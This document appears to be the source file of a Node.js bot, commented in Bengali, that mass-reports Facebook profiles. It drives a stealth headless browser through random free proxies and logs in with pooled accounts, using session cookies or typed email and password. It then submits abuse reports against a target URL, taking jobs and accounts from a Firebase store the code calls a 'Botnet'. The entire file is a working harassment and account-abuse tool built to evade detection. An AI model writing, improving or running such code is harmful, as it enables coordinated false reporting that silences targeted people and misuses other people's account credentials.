// language: JavaScript (ESM), file: spaam.mjs
import admin from 'firebase-admin';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import axios from 'axios';

puppeteer.use(StealthPlugin());

// ═══════════════════════════════════════════════════════════════
// ১. তোমার ফায়ারবেস সার্ভিস অ্যাকাউন্ট JSON এখানে বসাও
// ═══════════════════════════════════════════════════════════════
const serviceAccount = {
  "type": "service_account",
  "project_id": "cyber-spaam",
  "private_key_id": "xxxxx",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-xxxxx@cyber-spaam.iam.gserviceaccount.com",
  "client_id": "xxxxx",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-xxxxx%40cyber-spaam.iam.gserviceaccount.com"
};

const DATABASE_URL = "https://cyber-spaam-default-rtdb.asia-southeast1.firebasedatabase.app";

admin.initializeApp({ 
  credential: admin.credential.cert(serviceAccount),
  databaseURL: DATABASE_URL
});
const db = admin.database();

// ফ্রি প্রক্সি আনা
async function getFreeProxy() {
  try {
    const res = await axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt', { timeout: 5000 });
    const proxies = res.data.split('\n').filter(p => p.trim() !== '');
    return proxies[Math.floor(Math.random() * proxies.length)];
  } catch { return null; }
}

// ═══════════════════════════════════════════════════════════════
// ২. মূল অ্যাটাক ফাংশন (কুকি এবং পাসওয়ার্ড দুটোই হ্যান্ডেল করবে)
// ═══════════════════════════════════════════════════════════════
async function runAttack(targetUrl, account, proxy) {
  const args = ['--no-sandbox', '--disable-setuid-sandbox', '--disable-blink-features=AutomationControlled'];
  if (proxy) args.push(`--proxy-server=http://${proxy}`);

  const browser = await puppeteer.launch({ headless: "new", args });
  const page = await browser.newPage();
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36');

  try {
    // ১. যদি অ্যাকাউন্টে কুকি থাকে, সরাসরি কুকি সেট করো
    if (account.cookie) {
      console.log(`[BOT] Using Cookie for attack...`);
      const cookies = account.cookie.split('; ').map(c => {
        const [name, value] = c.split('=');
        return { name, value, domain: '.facebook.com' };
      });
      await page.setCookie(...cookies);

    // ২. যদি কুকি না থাকে কিন্তু ইমেইল-পাসওয়ার্ড থাকে, তবে লগইন করো
    } else if (account.email && account.password) {
      console.log(`[BOT] Logging in with Email: ${account.email}`);
      await page.goto('https://m.facebook.com/login', { waitUntil: 'networkidle2', timeout: 30000 });
      
      await page.waitForSelector('#m_login_email', { timeout: 10000 });
      await page.type('#m_login_email', account.email);
      await page.type('#m_login_password', account.password);
      await page.click('button[name="login"]');
      
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 });
      
      if (page.url().includes('checkpoint') || page.url().includes('login')) {
        throw new Error("Login failed / Checkpoint required");
      }
      console.log(`[BOT] Login successful!`);
    } else {
      throw new Error("No valid cookie or credentials found.");
    }

    // ৩. টার্গেট প্রোফাইলে যাওয়া এবং রিপোর্ট করা
    console.log(`[BOT] Attacking Target: ${targetUrl}`);
    await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });

    await page.waitForSelector('div[aria-label="More"], div[aria-label="Actions for this profile"]', { timeout: 15000 });
    await page.click('div[aria-label="More"], div[aria-label="Actions for this profile"]');
    await page.waitForTimeout(2000);

    const items = await page.$$('div[role="menuitem"]');
    for (const item of items) {
      const text = await page.evaluate(el => el.innerText, item);
      if (text.includes('Report') || text.includes('রিপোর্ট')) { await item.click(); break; }
    }
    await page.waitForTimeout(2000);

    const radios = await page.$$('div[role="radio"]');
    if (radios.length > 2) await radios[2].click();
    
    await page.waitForSelector('div[aria-label="Submit"]');
    await page.click('div[aria-label="Submit"]');
    
    console.log(`✅ [SUCCESS] Report sent!`);
    return true;
  } catch (err) {
    console.log(`❌ [FAIL] ${err.message}`);
    return false;
  } finally {
    await browser.close();
  }
}

// ═══════════════════════════════════════════════════════════════
// ৩. মেইন লজিক (ফায়ারবেস থেকে কাজ নেওয়া)
// ═══════════════════════════════════════════════════════════════
async function main() {
  const jobSnap = await db.ref('jobs').orderByChild('status').equalTo('pending').limitToFirst(1).once('value');
  if (!jobSnap.exists()) { console.log("No pending jobs."); process.exit(0); }

  let jobId, job;
  jobSnap.forEach(child => { jobId = child.key; job = child.val(); });

  const accSnap = await db.ref('accounts').once('value');
  const accounts = accSnap.val();
  if (!accounts) { console.log("No accounts in Botnet!"); process.exit(0); }

  const accKeys = Object.keys(accounts);
  const randomAccKey = accKeys[Math.floor(Math.random() * accKeys.length)];
  const randomAcc = accounts[randomAccKey];

  const proxy = await getFreeProxy();

  await db.ref(`jobs/${jobId}`).update({ status: 'running' });
  
  const success = await runAttack(job.targetUrl, randomAcc, proxy);

  if (success) {
    await db.ref(`jobs/${jobId}`).update({ status: 'completed' });
  } else {
    await db.ref(`jobs/${jobId}`).update({ status: 'failed' });
    await db.ref(`accounts/${randomAccKey}`).remove();
  }
}

main();
